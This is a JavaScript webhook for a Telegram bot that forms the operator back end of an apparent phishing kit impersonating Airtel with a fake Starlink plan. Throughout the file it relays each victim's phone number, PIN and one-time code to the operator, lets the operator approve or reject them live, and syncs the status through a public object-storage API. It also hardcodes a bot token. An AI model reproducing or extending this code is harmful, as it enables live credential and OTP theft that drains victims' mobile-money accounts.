const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8867971085:AAHFHldZq92uowOok2xZOrvN4HNX2DjQYj8';

export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  // Health check for webhook
  if (req.method === 'GET') {
    return res.status(200).json({ status: 'Telegram Webhook is operational.' });
  }

  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method Not Allowed' });
  }

  try {
    const update = req.body || {};

    if (update.callback_query) {
      const cq = update.callback_query;
      const callbackData = cq.data || '';
      const callbackId = cq.id;
      const msgId = cq.message?.message_id;
      const chatId = cq.message?.chat?.id;

      let recordId = '';
      let actionType = ''; // 'approve_login' | 'reject_login' | 'approve_otp' | 'reject_otp'

      if (callbackData.startsWith('approve_login_')) {
        recordId = callbackData.replace('approve_login_', '');
        actionType = 'approve_login';
      } else if (callbackData.startsWith('reject_login_')) {
        recordId = callbackData.replace('reject_login_', '');
        actionType = 'reject_login';
      } else if (callbackData.startsWith('approve_otp_')) {
        recordId = callbackData.replace('approve_otp_', '');
        actionType = 'approve_otp';
      } else if (callbackData.startsWith('reject_otp_')) {
        recordId = callbackData.replace('reject_otp_', '');
        actionType = 'reject_otp';
      }

      if (recordId) {
        // Fetch current cloud state from restful-api.dev
        let currentRecord = null;
        try {
          const fetchRes = await fetch(`https://api.restful-api.dev/objects/${recordId}`);
          if (fetchRes.ok) {
            currentRecord = await fetchRes.json();
          }
        } catch (e) {
          console.warn('Error fetching cloud record:', e);
        }

        const data = currentRecord?.data || {};

        if (actionType === 'approve_login') {
          data.loginStatus = 'approved';
          data.lastUpdated = Date.now();
        } else if (actionType === 'reject_login') {
          data.loginStatus = 'rejected';
          data.lastUpdated = Date.now();
        } else if (actionType === 'approve_otp') {
          data.otpStatus = 'approved';
          data.lastUpdated = Date.now();
        } else if (actionType === 'reject_otp') {
          data.otpStatus = 'rejected';
          data.lastUpdated = Date.now();
        }

        // Persist updated state to cloud
        try {
          await fetch(`https://api.restful-api.dev/objects/${recordId}`, {
            method: 'PUT',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              name: currentRecord?.name || recordId,
              data,
            }),
          });
        } catch (e) {
          console.warn('Error updating cloud record:', e);
        }

        // Answer Telegram callback query
        let alertMsg = 'Action enregistrée';
        if (actionType === 'approve_login') alertMsg = '✅ Connexion validée ! Passage au code OTP.';
        if (actionType === 'reject_login') alertMsg = '❌ Connexion refusée (Code PIN ou numéro incorrect).';
        if (actionType === 'approve_otp') alertMsg = '✅ Code OTP validé avec succès ! Forfait activé.';
        if (actionType === 'reject_otp') alertMsg = '❌ Code OTP rejeté ou invalide.';

        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            callback_query_id: callbackId,
            text: alertMsg,
            show_alert: true,
          }),
        }).catch((err) => console.warn('answerCallbackQuery error:', err));

        // Update message text in Telegram
        if (msgId && chatId) {
          let updatedText = '';
          const phone = data.phone || 'Inconnu';
          const planName = data.planName || 'Forfait Airtel Starlink';
          const planPrice = data.planPrice || '$1.49';
          const pin = data.pin || '****';
          const otp = data.otp || '****';

          if (actionType === 'approve_login') {
            updatedText =
              `🔴 <b>AIRTEL LITE - CONNEXION CLIENT VALIDÉE</b>\n\n` +
              `👤 <b>Numéro:</b> <code>+243 ${phone}</code>\n` +
              `🔑 <b>Code PIN:</b> <code>${pin}</code>\n` +
              `📦 <b>Forfait:</b> ${planName} (${planPrice})\n` +
              `🆔 <b>Session:</b> <code>${recordId}</code>\n` +
              `⏰ <b>Heure validation:</b> ${new Date().toLocaleTimeString('fr-FR')}\n\n` +
              `🟢 <b>STATUT: ✅ APPROUVÉ PAR L'ADMINISTRATEUR</b>\n` +
              `<i>L'utilisateur est redirigé vers la saisie du code OTP.</i>`;
          } else if (actionType === 'reject_login') {
            updatedText =
              `🔴 <b>AIRTEL LITE - CONNEXION CLIENT REFUSÉE</b>\n\n` +
              `👤 <b>Numéro:</b> <code>+243 ${phone}</code>\n` +
              `🔑 <b>Code PIN:</b> <code>${pin}</code>\n` +
              `📦 <b>Forfait:</b> ${planName} (${planPrice})\n` +
              `🆔 <b>Session:</b> <code>${recordId}</code>\n` +
              `⏰ <b>Heure refus:</b> ${new Date().toLocaleTimeString('fr-FR')}\n\n` +
              `🔴 <b>STATUT: ❌ REJETÉ (CODE PIN OU NUMÉRO INCORRECT)</b>\n` +
              `<i>L'utilisateur a été notifié de l'erreur sur son écran.</i>`;
          } else if (actionType === 'approve_otp') {
            updatedText =
              `🔐 <b>AIRTEL LITE - CODE DE VÉRIFICATION OTP VALIDÉ</b>\n\n` +
              `👤 <b>Numéro:</b> <code>+243 ${phone}</code>\n` +
              `🔢 <b>Code OTP:</b> <code>${otp}</code>\n` +
              `📦 <b>Forfait:</b> ${planName} (${planPrice})\n` +
              `🆔 <b>Session:</b> <code>${recordId}</code>\n` +
              `⏰ <b>Heure validation:</b> ${new Date().toLocaleTimeString('fr-FR')}\n\n` +
              `🟢 <b>STATUT: ✅ OTP CONFIRMÉ ET VALIDÉ</b>\n` +
              `<i>Paiement réussi et forfait Starlink activé !</i>`;
          } else if (actionType === 'reject_otp') {
            updatedText =
              `🔐 <b>AIRTEL LITE - CODE DE VÉRIFICATION OTP REFUSÉ</b>\n\n` +
              `👤 <b>Numéro:</b> <code>+243 ${phone}</code>\n` +
              `🔢 <b>Code OTP:</b> <code>${otp}</code>\n` +
              `📦 <b>Forfait:</b> ${planName} (${planPrice})\n` +
              `🆔 <b>Session:</b> <code>${recordId}</code>\n` +
              `⏰ <b>Heure refus:</b> ${new Date().toLocaleTimeString('fr-FR')}\n\n` +
              `🔴 <b>STATUT: ❌ OTP REJETÉ / INVALIDE</b>`;
          }

          if (updatedText) {
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({
                chat_id: chatId,
                message_id: msgId,
                text: updatedText,
                parse_mode: 'HTML',
              }),
            }).catch((err) => console.warn('editMessageText error:', err));
          }
        }
      }
    }

    return res.status(200).json({ ok: true });
  } catch (err) {
    console.error('Error in Telegram Webhook:', err);
    return res.status(200).json({ ok: true, error: err.message });
  }
}
